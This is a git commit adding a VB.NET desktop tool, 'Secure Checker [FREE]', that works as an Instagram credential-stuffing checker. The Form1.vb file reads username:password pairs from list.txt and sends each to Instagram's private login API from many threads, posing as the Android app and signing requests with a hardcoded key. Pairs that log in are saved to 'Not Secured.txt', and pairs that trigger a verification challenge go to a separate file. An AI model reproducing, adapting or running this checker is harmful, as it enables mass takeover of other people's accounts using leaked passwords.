231d5acee299e51a6fee545bf18ff405d272559b
Hady Saleh <40350360+hadysata@users.noreply.github.com>
2018-07-20 19:18:15 +0300

    Add files via upload

---
+++ Secure Checker [FREE]/Secure Checker [FREE]/Form1.Designer.vb
@@ -0,0 +1,214 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.Panel1 = New System.Windows.Forms.Panel()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.GroupBox8 = New System.Windows.Forms.GroupBox()
+        Me.TextBox4 = New System.Windows.Forms.TextBox()
+        Me.Button6 = New System.Windows.Forms.Button()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Panel1.SuspendLayout()
+        Me.GroupBox2.SuspendLayout()
+        Me.GroupBox1.SuspendLayout()
+        Me.GroupBox8.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'Panel1
+        '
+        Me.Panel1.BackColor = System.Drawing.SystemColors.Control
+        Me.Panel1.Controls.Add(Me.Label3)
+        Me.Panel1.Controls.Add(Me.ProgressBar1)
+        Me.Panel1.Controls.Add(Me.GroupBox2)
+        Me.Panel1.Controls.Add(Me.GroupBox1)
+        Me.Panel1.Controls.Add(Me.GroupBox8)
+        Me.Panel1.Controls.Add(Me.Button6)
+        Me.Panel1.Location = New System.Drawing.Point(4, 24)
+        Me.Panel1.Name = "Panel1"
+        Me.Panel1.Size = New System.Drawing.Size(170, 219)
+        Me.Panel1.TabIndex = 0
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(22, 197)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(119, 13)
+        Me.Label3.TabIndex = 2
+        Me.Label3.Text = "Coded By : @Hadysata"
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.Location = New System.Drawing.Point(4, 174)
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.Size = New System.Drawing.Size(160, 19)
+        Me.ProgressBar1.TabIndex = 11
+        '
+        'GroupBox2
+        '
+        Me.GroupBox2.Controls.Add(Me.TextBox2)
+        Me.GroupBox2.Location = New System.Drawing.Point(4, 127)
+        Me.GroupBox2.Name = "GroupBox2"
+        Me.GroupBox2.Size = New System.Drawing.Size(160, 41)
+        Me.GroupBox2.TabIndex = 10
+        Me.GroupBox2.TabStop = False
+        Me.GroupBox2.Text = "Else"
+        '
+        'TextBox2
+        '
+        Me.TextBox2.BackColor = System.Drawing.SystemColors.Control
+        Me.TextBox2.BorderStyle = System.Windows.Forms.BorderStyle.None
+        Me.TextBox2.ForeColor = System.Drawing.Color.Gray
+        Me.TextBox2.Location = New System.Drawing.Point(6, 15)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(148, 13)
+        Me.TextBox2.TabIndex = 1
+        Me.TextBox2.Text = "0"
+        Me.TextBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'GroupBox1
+        '
+        Me.GroupBox1.Controls.Add(Me.TextBox1)
+        Me.GroupBox1.Location = New System.Drawing.Point(4, 80)
+        Me.GroupBox1.Name = "GroupBox1"
+        Me.GroupBox1.Size = New System.Drawing.Size(160, 41)
+        Me.GroupBox1.TabIndex = 9
+        Me.GroupBox1.TabStop = False
+        Me.GroupBox1.Text = "Secured"
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BackColor = System.Drawing.SystemColors.Control
+        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None
+        Me.TextBox1.ForeColor = System.Drawing.Color.Red
+        Me.TextBox1.Location = New System.Drawing.Point(6, 15)
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(148, 13)
+        Me.TextBox1.TabIndex = 1
+        Me.TextBox1.Text = "0"
+        Me.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'GroupBox8
+        '
+        Me.GroupBox8.Controls.Add(Me.TextBox4)
+        Me.GroupBox8.Location = New System.Drawing.Point(4, 33)
+        Me.GroupBox8.Name = "GroupBox8"
+        Me.GroupBox8.Size = New System.Drawing.Size(160, 41)
+        Me.GroupBox8.TabIndex = 8
+        Me.GroupBox8.TabStop = False
+        Me.GroupBox8.Text = "Not Secured"
+        '
+        'TextBox4
+        '
+        Me.TextBox4.BackColor = System.Drawing.SystemColors.Control
+        Me.TextBox4.BorderStyle = System.Windows.Forms.BorderStyle.None
+        Me.TextBox4.ForeColor = System.Drawing.Color.Green
+        Me.TextBox4.Location = New System.Drawing.Point(6, 15)
+        Me.TextBox4.Name = "TextBox4"
+        Me.TextBox4.Size = New System.Drawing.Size(148, 13)
+        Me.TextBox4.TabIndex = 1
+        Me.TextBox4.Text = "0"
+        Me.TextBox4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Button6
+        '
+        Me.Button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button6.Location = New System.Drawing.Point(4, 4)
+        Me.Button6.Name = "Button6"
+        Me.Button6.Size = New System.Drawing.Size(160, 23)
+        Me.Button6.TabIndex = 3
+        Me.Button6.Text = "- Start"
+        Me.Button6.UseVisualStyleBackColor = True
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.ForeColor = System.Drawing.Color.White
+        Me.Label1.Location = New System.Drawing.Point(12, 6)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(125, 13)
+        Me.Label1.TabIndex = 1
+        Me.Label1.Text = "- Secure Checker [FREE]"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.ForeColor = System.Drawing.Color.White
+        Me.Label2.Location = New System.Drawing.Point(164, 6)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(13, 13)
+        Me.Label2.TabIndex = 0
+        Me.Label2.Text = "X"
+        '
+        'Timer1
+        '
+        Me.Timer1.Enabled = True
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.SystemColors.MenuText
+        Me.ClientSize = New System.Drawing.Size(178, 246)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.Panel1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.Name = "Form1"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Form1"
+        Me.Panel1.ResumeLayout(False)
+        Me.Panel1.PerformLayout()
+        Me.GroupBox2.ResumeLayout(False)
+        Me.GroupBox2.PerformLayout()
+        Me.GroupBox1.ResumeLayout(False)
+        Me.GroupBox1.PerformLayout()
+        Me.GroupBox8.ResumeLayout(False)
+        Me.GroupBox8.PerformLayout()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents Panel1 As System.Windows.Forms.Panel
+    Friend WithEvents Label1 As System.Windows.Forms.Label
+    Friend WithEvents Label2 As System.Windows.Forms.Label
+    Friend WithEvents Label3 As System.Windows.Forms.Label
+    Friend WithEvents ProgressBar1 As System.Windows.Forms.ProgressBar
+    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
+    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
+    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
+    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
+    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
+    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
+    Friend WithEvents Button6 As System.Windows.Forms.Button
+    Friend WithEvents Timer1 As System.Windows.Forms.Timer
+
+End Class
---
+++ Secure Checker [FREE]/Secure Checker [FREE]/Form1.vb
@@ -0,0 +1,243 @@
+﻿Imports System.Net
+Imports System.Text
+Imports System.IO
+Imports System.Threading
+
+Public Class Form1
+
+    Private isMouseDown As Boolean = False
+    Private mouseOffset As Point
+    Dim secured As Integer = 0
+    Dim notSecured As Integer = 0
+    Dim other As Integer = 0
+    Dim done As Integer = 0
+    Dim list() As String
+
+    Dim s As New ListBox
+    Dim Ns As New ListBox
+    Dim e As New ListBox
+
+
+
+
+
+    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
+        Me.Close()
+    End Sub
+
+    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
+        End
+    End Sub
+
+    Private Sub me_MouseMove(sender As Object, e As MouseEventArgs) Handles Me.MouseMove
+        If isMouseDown Then
+            Dim mousePos As Point = Control.MousePosition
+            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
+            Me.Location = mousePos
+        End If
+    End Sub
+
+    Private Sub me_MouseUp(sender As Object, e As MouseEventArgs) Handles Me.MouseUp
+        If e.Button = Windows.Forms.MouseButtons.Left Then
+            isMouseDown = False
+        End If
+    End Sub
+    Private Sub me_MouseDown(sender As Object, e As MouseEventArgs) Handles Me.MouseDown
+        If e.Button = Windows.Forms.MouseButtons.Left Then
+            mouseOffset = New Point(-e.X, -e.Y)
+            isMouseDown = True
+        End If
+
+
+
+    End Sub
+
+    Private Sub Label1_MouseMove(sender As Object, e As MouseEventArgs) Handles Label1.MouseMove
+        If isMouseDown Then
+            Dim mousePos As Point = Control.MousePosition
+            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
+            Me.Location = mousePos
+
+        End If
+    End Sub
+
+    Private Sub Label1_MouseUp(sender As Object, e As MouseEventArgs) Handles Label1.MouseUp
+        If e.Button = Windows.Forms.MouseButtons.Left Then
+            isMouseDown = False
+        End If
+    End Sub
+    Private Sub Label1_MouseDown(sender As Object, e As MouseEventArgs) Handles Label1.MouseDown
+        If e.Button = Windows.Forms.MouseButtons.Left Then
+            mouseOffset = New Point(-e.X, -e.Y)
+            isMouseDown = True
+        End If
+
+    End Sub
+
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        Try
+            TextBox4.Text = notSecured
+            TextBox1.Text = secured
+            TextBox2.Text = other
+
+            ProgressBar1.Value = done
+        Catch ex As Exception
+            Timer1.Start()
+        End Try
+
+    End Sub
+
+    Function ran() As String
+        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        Static r As New Random
+        Dim chactersInString As Integer = r.Next(7, 8)
+        Dim sb As New StringBuilder
+        For i As Integer = 1 To chactersInString
+            Dim idx As Integer = r.Next(0, s.Length)
+            sb.Append(s.Substring(idx, 1))
+        Next
+        Return sb.ToString()
+    End Function
+
+  
+    Private Sub check(user As String, pass As String)
+        Try
+            ServicePointManager.DefaultConnectionLimit = 300
+            ServicePointManager.UseNagleAlgorithm = False
+            ServicePointManager.Expect100Continue = False
+            ServicePointManager.CheckCertificateRevocationList = False
+            Dim request As HttpWebRequest = HttpWebRequest.Create("https://i.instagram.com/api/v1/accounts/login/")
+            request.CookieContainer = New CookieContainer
+            request.Method = "POST"
+            request.Accept = "*/*"
+            '  request.Proxy = Nothing
+            request.Headers.Add("X-IG-Connection-Type", "WiFi")
+            request.Headers.Add("Accept-Language", "ar-SA;q=1, en-SA;q=0.9")
+            request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
+            request.UserAgent = "Instagram 10.3.2 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
+            request.Headers.Add("X-IG-Capabilities: 3wI=")
+            Dim data As String = "{""username"":""" & user & """,""password"":""" & pass & """,""_csrftoken"":""" & ran() & """,""device_id"":""" & Guid.NewGuid.ToString.ToUpper & """,""login_attempt_count"":""0""}"
+            Dim sb As New StringBuilder
+            Try
+                Dim secretkey As String = "5ad7d6f013666cc93c88fc8af940348bd067b68f0dce3c85122a923f4f74b251"
+                Dim sha As New System.Security.Cryptography.HMACSHA256(System.Text.ASCIIEncoding.ASCII.GetBytes(secretkey))
+                Dim Hash() As Byte = sha.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(data))
+                sb = New StringBuilder(Hash.Length * 2)
+                For Each B As Byte In Hash
+                    sb.Append(Hex(B).PadLeft(2, "0"))
+                Next
+            Catch ex As Exception : End Try
+            Dim postData As String = "ig_sig_key_version=4&signed_body=" & sb.ToString.ToLower & "." & Web.HttpUtility.UrlEncode(data)
+            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
+            request.ContentLength = byteArray.Length
+            Dim dataStream As Stream = request.GetRequestStream()
+            dataStream.Write(byteArray, 0, byteArray.Length)
+            dataStream.Close()
+            Dim response As HttpWebResponse = request.GetResponse()
+            dataStream = response.GetResponseStream()
+            Dim reader As New StreamReader(dataStream)
+            Dim responseFromServer As String = reader.ReadToEnd()
+
+            reader.Close()
+            dataStream.Close()
+            response.Close()
+
+            notSecured += 1
+            Ns.Items.Add(user & ":" & pass)
+          
+           
+
+        Catch ex As WebException
+            Dim response As WebResponse = ex.Response
+            Dim statusCode As HttpStatusCode
+            Dim ResponseText As String
+            Dim httpResponse As HttpWebResponse = CType(response, HttpWebResponse)
+            statusCode = httpResponse.StatusCode
+            Dim myStreamReader As New StreamReader(response.GetResponseStream())
+            Using (myStreamReader)
+                ResponseText = myStreamReader.ReadToEnd
+            End Using
+
+            If ResponseText.Contains("challenge") = True Then
+                secured += 1
+                s.Items.Add(user & ":" & pass)
+
+
+            Else
+                other += 1
+                e.Items.Add(user & ":" & pass)
+
+               
+
+            End If
+
+
+
+        End Try
+
+        done += 1
+    End Sub
+
+    Private Sub go(ByVal up)
+        up = Split(up, ":")
+        check(up(0), up(1))
+    End Sub
+    Private Sub work()
+        Try
+            For i As Integer = 0 To list.Count - 1
+                Dim th As New Thread(AddressOf go) : th.Start(list(i))
+                Thread.Sleep(150)
+            Next
+
+            Try
+                Dim s As New IO.StreamWriter("Not Secured.txt", True)
+                For i = 0 To Ns.Items.Count - 1
+                    s.WriteLine(Ns.Items.Item(i))
+                Next
+                s.Close()
+            Catch ex As Exception : End Try
+
+            Try
+                Dim sv As New IO.StreamWriter("Secured.txt", True)
+                For i = 0 To s.Items.Count - 1
+                    sv.WriteLine(s.Items.Item(i))
+                Next
+                sv.Close()
+            Catch ex As Exception : End Try
+
+            Try
+                Dim s As New IO.StreamWriter("Else.txt", True)
+                For i = 0 To e.Items.Count - 1
+                    s.WriteLine(e.Items.Item(i))
+                Next
+                s.Close()
+            Catch ex As Exception : End Try
+
+        Catch ex As Exception
+            Thread.Sleep(500)
+            work()
+        End Try
+    End Sub
+
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        Try
+            list = IO.File.ReadAllLines("list.txt")
+        Catch ex As Exception
+            MsgBox("list.txt" & vbCrLf & "missing", MsgBoxStyle.Critical)
+            Me.Close()
+        End Try
+
+        ProgressBar1.Maximum = list.Count
+
+
+    End Sub
+
+    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
+        Dim th As New Thread(AddressOf work) : th.Start()
+    End Sub
+
+ 
+End Class
